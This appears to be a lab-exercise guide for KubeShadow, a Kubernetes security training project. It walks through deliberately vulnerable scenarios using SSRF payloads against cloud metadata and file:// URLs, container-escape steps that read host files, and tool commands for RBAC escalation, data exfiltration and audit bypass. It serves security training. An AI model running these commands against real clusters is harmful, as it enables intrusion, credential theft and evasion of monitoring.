# Comprehensive Lab Exercises

This document provides comprehensive exercises for all KubeShadow lab scenarios, following the Kubernetes Goat methodology.

## 🎯 Exercise Overview

These exercises are designed to provide hands-on experience with various Kubernetes security vulnerabilities, from beginner to advanced levels.

## 📋 Exercise Categories

### 1. SSRF (Server-Side Request Forgery) Exercises
**Namespace:** `ssrf-lab`

#### Exercise 1.1: Basic SSRF Discovery
```bash
# Deploy the lab
kubectl apply -f 17-ssrf-vulnerability.yaml

# Access the vulnerable web application
curl http://<node-ip>:30080

# Test basic SSRF
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://internal-api:8080"
```

#### Exercise 1.2: Internal Network Discovery
```bash
# Test internal API access
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://internal-api:8080"

# Test metadata access
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://169.254.169.254"

# Test Kubernetes API access
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://kubernetes.default.svc.cluster.local"
```

#### Exercise 1.3: Advanced SSRF Techniques
```bash
# Test port scanning
for port in {1..1000}; do
  curl -X POST http://<node-ip>:30080/ssrf -d "url=http://internal-api:$port"
done

# Test protocol schemes
curl -X POST http://<node-ip>:30080/ssrf -d "url=file:///etc/passwd"
curl -X POST http://<node-ip>:30080/ssrf -d "url=gopher://internal-api:8080"
```

### 2. Container Escape Exercises
**Namespace:** `container-escape-lab`

#### Exercise 2.1: Privileged Container Escape
```bash
# Deploy the lab
kubectl apply -f 18-container-escape.yaml

# Access privileged container
kubectl exec -it privileged-escape-pod -n container-escape-lab -- /bin/sh

# Test host access
ls -la /host/
cat /host/etc/passwd
```

#### Exercise 2.2: Docker Socket Escape
```bash
# Access Docker socket pod
kubectl exec -it docker-socket-pod -n container-escape-lab -- /bin/sh

# Test Docker socket access
ls -la /var/run/docker.sock
docker ps
docker images
```

#### Exercise 2.3: Cgroup Escape
```bash
# Access cgroup escape pod
kubectl exec -it cgroup-escape-pod -n container-escape-lab -- /bin/sh

# Test cgroup escape
cat /proc/self/cgroup
ls -la /host/proc/
```

#### Exercise 2.4: Kernel Module Escape
```bash
# Access kernel module pod
kubectl exec -it kernel-module-pod -n container-escape-lab -- /bin/sh

# Test kernel module access
ls -la /lib/modules/
ls -la /host/usr/
```

### 3. Supply Chain Attack Exercises
**Namespace:** `supply-chain-lab`

#### Exercise 3.1: Malicious Registry Analysis
```bash
# Deploy the lab
kubectl apply -f 19-supply-chain-attack.yaml

# Access malicious registry
curl http://<node-ip>:30082/v2/_catalog

# Test registry authentication
curl -u malicious-user:malicious-password http://<node-ip>:30082/v2/_catalog
```

#### Exercise 3.2: Compromised Application Analysis
```bash
# Access compromised application
kubectl exec -it compromised-app-<pod-id> -n supply-chain-lab -- /bin/sh

# Check for malicious binaries
ls -la /malicious/
cat /malicious/backdoor.sh
```

#### Exercise 3.3: Dependency Analysis
```bash
# Access compromised dependencies pod
kubectl exec -it compromised-dependencies -n supply-chain-lab -- /bin/sh

# Check for malicious packages
ls -la /app/node_modules/
find /app/node_modules/ -name "*.js" -exec grep -l "malicious" {} \;
```

#### Exercise 3.4: Base Image Analysis
```bash
# Access compromised base image pod
kubectl exec -it compromised-base-image -n supply-chain-lab -- /bin/sh

# Check for malicious binaries
ls -la /malicious/
cat /malicious/data-exfil.sh
```

### 4. Crypto Miner Exercises
**Namespace:** `crypto-miner-lab`

#### Exercise 4.1: Resource Monitoring
```bash
# Deploy the lab
kubectl apply -f 20-crypto-miner.yaml

# Monitor resource usage
kubectl top pods -n crypto-miner-lab
kubectl describe pods -n crypto-miner-lab
```

#### Exercise 4.2: Mining Process Analysis
```bash
# Access crypto miner pod
kubectl exec -it crypto-miner-pod -n crypto-miner-lab -- /bin/sh

# Check mining processes
ps aux | grep -i mining
cat /tmp/mining.log
```

#### Exercise 4.3: GPU Mining Analysis
```bash
# Access GPU miner pod
kubectl exec -it gpu-miner-pod -n crypto-miner-lab -- /bin/sh

# Check GPU usage
nvidia-smi
cat /tmp/gpu-mining.log
```

#### Exercise 4.4: Hidden Miner Detection
```bash
# Access hidden miner pod
kubectl exec -it nginx-proxy -n crypto-miner-lab -- /bin/sh

# Check for hidden processes
ps aux | grep -v nginx
ls -la /hidden/
```

### 5. DNS Poisoning Exercises
**Namespace:** `dns-poisoning-lab`

#### Exercise 5.1: DNS Cache Poisoning
```bash
# Deploy the lab
kubectl apply -f 21-dns-poisoning.yaml

# Access DNS cache poisoning pod
kubectl exec -it dns-cache-poisoning -n dns-poisoning-lab -- /bin/sh

# Test DNS cache poisoning
cat /tmp/poison.log
ls -la /var/cache/dns/
```

#### Exercise 5.2: DNS Hijacking
```bash
# Access DNS hijacking pod
kubectl exec -it dns-hijacking -n dns-poisoning-lab -- /bin/sh

# Test DNS hijacking
cat /tmp/hijack.log
ls -la /etc/dns-hijack/
```

#### Exercise 5.3: DNS Spoofing
```bash
# Access DNS spoofing pod
kubectl exec -it dns-spoofing -n dns-poisoning-lab -- /bin/sh

# Test DNS spoofing
cat /tmp/spoof.log
ls -la /etc/dns-spoof/
```

#### Exercise 5.4: Malicious DNS Server
```bash
# Access malicious DNS server
kubectl exec -it malicious-dns-server-<pod-id> -n dns-poisoning-lab -- /bin/sh

# Test DNS server
nslookup malicious.example.com 127.0.0.1
dig @127.0.0.1 malicious.example.com
```

## 🎓 Advanced Exercises

### Exercise A.1: Multi-Vector Attack
```bash
# Deploy all labs
kubectl apply -f 17-ssrf-vulnerability.yaml
kubectl apply -f 18-container-escape.yaml
kubectl apply -f 19-supply-chain-attack.yaml
kubectl apply -f 20-crypto-miner.yaml
kubectl apply -f 21-dns-poisoning.yaml

# Use SSRF to access internal services
curl -X POST http://<node-ip>:30080/ssrf -d "url=http://malicious-registry:5000"

# Use container escape to access host
kubectl exec -it privileged-escape-pod -n container-escape-lab -- /bin/sh

# Use supply chain to deploy malicious image
kubectl run test-pod --image=malicious-registry:5000/vulnerable-app:latest -n supply-chain-lab
```

### Exercise A.2: Stealth Techniques
```bash
# Use hidden miner for stealth
kubectl exec -it nginx-proxy -n crypto-miner-lab -- /bin/sh

# Use DNS poisoning for traffic redirection
kubectl exec -it dns-cache-poisoning -n dns-poisoning-lab -- /bin/sh

# Use container escape for persistence
kubectl exec -it privileged-escape-pod -n container-escape-lab -- /bin/sh
```

### Exercise A.3: Data Exfiltration
```bash
# Use KubeShadow for data exfiltration
./kubeshadow data-exfil --presigned-url "YOUR_URL" --export-recon --dashboard

# Use supply chain for data collection
kubectl exec -it compromised-app-<pod-id> -n supply-chain-lab -- /bin/sh

# Use container escape for host data access
kubectl exec -it privileged-escape-pod -n container-escape-lab -- /bin/sh
```

## 🔍 KubeShadow Integration

### Using KubeShadow Dashboard
```bash
# Start dashboard
./kubeshadow dashboard

# Run reconnaissance on specific labs
./kubeshadow recon --namespace ssrf-lab --dashboard
./kubeshadow recon --namespace container-escape-lab --dashboard
./kubeshadow recon --namespace supply-chain-lab --dashboard
./kubeshadow recon --namespace crypto-miner-lab --dashboard
./kubeshadow recon --namespace dns-poisoning-lab --dashboard

# Test specific attack vectors
./kubeshadow sidecar-inject --namespace container-escape-lab --dashboard
./kubeshadow rbac-escalate --namespace supply-chain-lab --dashboard
./kubeshadow data-exfil --presigned-url "YOUR_URL" --dashboard
```

### Using KubeShadow Commands
```bash
# Test RBAC escalation
./kubeshadow rbac-escalate --namespace ssrf-lab --dashboard

# Test sidecar injection
./kubeshadow sidecar-inject --namespace container-escape-lab --dashboard

# Test data exfiltration
./kubeshadow data-exfil --presigned-url "YOUR_URL" --export-recon --dashboard

# Test stealth techniques
./kubeshadow audit-bypass --namespace dns-poisoning-lab --dashboard
```

## 🛡️ Security Testing

### Vulnerability Assessment
```bash
# Check for privileged containers
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext.privileged}{"\n"}{end}'

# Check for host network access
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.hostNetwork}{"\n"}{end}'

# Check for host path mounts
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.volumes[*].hostPath.path}{"\n"}{end}'
```

### Resource Monitoring
```bash
# Monitor resource usage
kubectl top pods --all-namespaces
kubectl top nodes

# Check for crypto mining
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].resources.limits.cpu}{"\n"}{end}'
```

### Network Analysis
```bash
# Check for exposed services
kubectl get services --all-namespaces
kubectl get ingress --all-namespaces

# Check for DNS configuration
kubectl get configmaps --all-namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.data}{"\n"}{end}'
```

## 🧹 Cleanup

### Individual Lab Cleanup
```bash
# Clean up SSRF lab
kubectl delete -f 17-ssrf-vulnerability.yaml

# Clean up container escape lab
kubectl delete -f 18-container-escape.yaml

# Clean up supply chain lab
kubectl delete -f 19-supply-chain-attack.yaml

# Clean up crypto miner lab
kubectl delete -f 20-crypto-miner.yaml

# Clean up DNS poisoning lab
kubectl delete -f 21-dns-poisoning.yaml
```

### Complete Lab Cleanup
```bash
# Clean up all labs
kubectl delete -f 17-ssrf-vulnerability.yaml
kubectl delete -f 18-container-escape.yaml
kubectl delete -f 19-supply-chain-attack.yaml
kubectl delete -f 20-crypto-miner.yaml
kubectl delete -f 21-dns-poisoning.yaml

# Verify cleanup
kubectl get pods --all-namespaces | grep -E "(ssrf|container-escape|supply-chain|crypto-miner|dns-poisoning)"
```

## 📚 Learning Resources

### Documentation
- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)
- [KubeShadow Main Documentation](../../README.md)
- [Lab Environment Setup](../../lab/README.md)

### Learning Resources
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [Container Security Guidelines](https://kubernetes.io/docs/concepts/containers/security-context/)
- [RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)

## 🎯 Assessment

### Beginner Level
- [ ] Successfully deploy lab environments
- [ ] Identify basic security vulnerabilities
- [ ] Use KubeShadow dashboard effectively
- [ ] Complete basic exercises

### Intermediate Level
- [ ] Understand attack vectors
- [ ] Perform manual security testing
- [ ] Use advanced KubeShadow commands
- [ ] Complete intermediate exercises

### Advanced Level
- [ ] Design custom attack scenarios
- [ ] Perform multi-vector attacks
- [ ] Use stealth techniques
- [ ] Complete advanced exercises

## 🤝 Contributing

We welcome contributions to improve the lab exercises:

1. **Report issues** with exercises
2. **Suggest new exercises** for educational value
3. **Improve documentation** and examples
4. **Add new attack vectors** or vulnerabilities
5. **Enhance security configurations** for realistic testing

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](../../LICENSE) file for details.

## 🙏 Acknowledgments

- **Kubernetes Goat** for the excellent educational methodology
- **Kubernetes community** for the excellent platform
- **Security researchers** who identified the vulnerabilities we simulate
- **Educational institutions** that provided feedback on lab scenarios
- **Open source contributors** who made this project possible

---

**Happy Learning! 🚀**

The KubeShadow Lab exercises provide endless possibilities for Kubernetes security learning. Experiment, explore, and always practice responsibly!

For questions, issues, or contributions, please visit our [GitHub repository](https://github.com/kubeshadow/kubeshadow).
